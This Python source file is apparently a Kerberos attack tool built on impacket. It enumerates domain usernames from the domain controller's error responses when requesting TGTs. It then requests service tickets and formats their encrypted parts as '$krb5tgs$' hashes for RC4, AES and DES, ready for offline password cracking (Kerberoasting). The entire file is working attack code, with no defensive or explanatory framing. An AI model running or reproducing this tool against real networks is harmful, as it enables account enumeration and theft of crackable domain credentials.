import logging
import sys
from binascii import unhexlify, hexlify
from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
from impacket.krb5 import constants
from impacket.krb5.types import Principal
from impacket.krb5.kerberosv5 import sendReceive, KerberosError, SessionError
from pyasn1.codec.der import decoder
from impacket.krb5.asn1 import TGS_REP, AS_REP
import traceback
import socket
class TGT:
    def __init__(self, domain, username, dc, password='', preauth=False, nthash='', lmhash='', aeskey=''):
        self.username = username
        self.domain = domain
        self.password = password
        self.dc = dc
        self.preauth = preauth
        self.nthash = nthash
        self.lmhash = lmhash
        self.aeskey = aeskey
        self.dc_ip = socket.gethostbyname(self.dc)




    def run(self) -> {'tgt':any, 'cipher':any, 'oldSessionKey':any, 'newSessonKey':any}:
        """setting save to True will save the tgt to the {username}.ccache"""
        userclient = Principal(self.username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
        try:
            tgt, cipher, old, new = getKerberosTGT(clientName=userclient, password=self.password, 
                                               domain=self.domain, lmhash=self.lmhash, nthash=self.nthash, 
                                               kdcHost=self.dc_ip)
        
            return {'tgt': tgt, 'cipher':cipher, 'oldSessionKey':old, 'newSessionKey':new}
        
        except AttributeError:
            sys.stdout.flush()
            print("")
            print(f"\n3 found user: {self.username} \n")
            return None
        except SessionError as e:
            try:
                code = e.getErrorCode()
                if code != 6:
                    sys.stdout.flush()
                    print(f"\n 1found user: {self.username} {e} on code: {code}")
            except:
                sys.stdout.flush()
                print(f"\n 2found user: {self.username}")
        except Exception as e:
            print(f"1 {traceback.format_exc()}")
            print(f'trying with domain instead of user....')
            serverName = Principal('ldap/%s' % self.domain, type=constants.PrincipalNameType.NT_SRV_INST.value)
            try:
                tgt, cipher, old, new = getKerberosTGT(clientName=serverName, password=self.password, 
                                               domain=self.domain, lmhash=self.lmhash, nthash=self.nthash, 
                                               kdcHost=self.dc_ip)
                return {'tgt': tgt, 'cipher':cipher, 'oldSessionKey':old, 'newSessionKey':new}
            except Exception as e:
                print(f"0 {traceback.format_exc()}")

            return 1



class TGS:
    def __init__(self, tgt, domain, cipher, oldSessionKey, newSessionKey, username, dc,password='', nthash=None, lmhash=None,preauth=False, aeskey=None):
        self.tgt = tgt
        self.cipher=cipher
        self.old = oldSessionKey
        self.new = newSessionKey
        self.username = username
        self.dc = dc
        self.password = password
        self.nthash = nthash
        self.lmhash = lmhash
        self.preauth = preauth
        self.aeskey = aeskey
        self.domain = domain
        self.dc_ip = socket.gethostbyname(self.dc)





    def run(self, fd=None):
        """change fd to save to file, will return entry if there is one"""
        spn = self.domain + '/' + self.username
        formatted_name = self.domain + "\\" + self.username
        userclient = Principal()
        userclient.type = constants.PrincipalNameType.NT_MS_PRINCIPAL.value
        userclient.components = formatted_name
        entry = None
        tgs, cipher, old, key = getKerberosTGS(userclient, self.domain, self.dc_ip, self.tgt, self.cipher, self.new)
        if self.preauth == False:
            try:
                decodes = decoder.decode(tgs, asn1Spec=AS_REP())[0]
            except Exception as e:
                print(e)
                decodes = decoder.decode(tgs, asn1Spec=TGS_REP())[0]
        else:
            decodes = decoder.decode(tgs, asn1Spec=TGS_REP())[0]

        if decodes['ticket']['enc-part']['etype'] == constants.EncryptionTypes.rc4_hmac.value:
            entry = '$krb5tgs$%d$*%s$%s$%s*$%s$%s' % (
                constants.EncryptionTypes.rc4_hmac.value, self.username, decodes['ticket']['realm'],
                spn.replace(':', '~'),
                hexlify(decodes['ticket']['enc-part']['cipher'][:16].asOctets()).decode(),
                hexlify(decodes['ticket']['enc-part']['cipher'][16:].asOctets()).decode())
            if fd is None:
                print(entry)
            else:
                fd.write(entry + '\n')
        elif decodes['ticket']['enc-part']['etype'] == constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value:
            entry = '$krb5tgs$%d$%s$%s$*%s*$%s$%s' % (
                constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value, self.username, decodes['ticket']['realm'],
                spn.replace(':', '~'),
                hexlify(decodes['ticket']['enc-part']['cipher'][-12:].asOctets()).decode(),
                hexlify(decodes['ticket']['enc-part']['cipher'][:-12:].asOctets()).decode())
            if fd is None:
                print(entry)
            else:
                fd.write(entry + '\n')
        elif decodes['ticket']['enc-part']['etype'] == constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value:
            entry = '$krb5tgs$%d$%s$%s$*%s*$%s$%s' % (
                constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value, self.username, decodes['ticket']['realm'],
                spn.replace(':', '~'),
                hexlify(decodes['ticket']['enc-part']['cipher'][-12:].asOctets()).decode(),
                hexlify(decodes['ticket']['enc-part']['cipher'][:-12:].asOctets()).decode())
            if fd is None:
                print(entry)
            else:
                fd.write(entry + '\n')
        elif decodes['ticket']['enc-part']['etype'] == constants.EncryptionTypes.des_cbc_md5.value:
            entry = '$krb5tgs$%d$*%s$%s$%s*$%s$%s' % (
                constants.EncryptionTypes.des_cbc_md5.value, self.username, decodes['ticket']['realm'],
                spn.replace(':', '~'),
                hexlify(decodes['ticket']['enc-part']['cipher'][:16].asOctets()).decode(),
                hexlify(decodes['ticket']['enc-part']['cipher'][16:].asOctets()).decode())
            if fd is None:
                print(entry)
            else:
                fd.write(entry + '\n')
        return entry

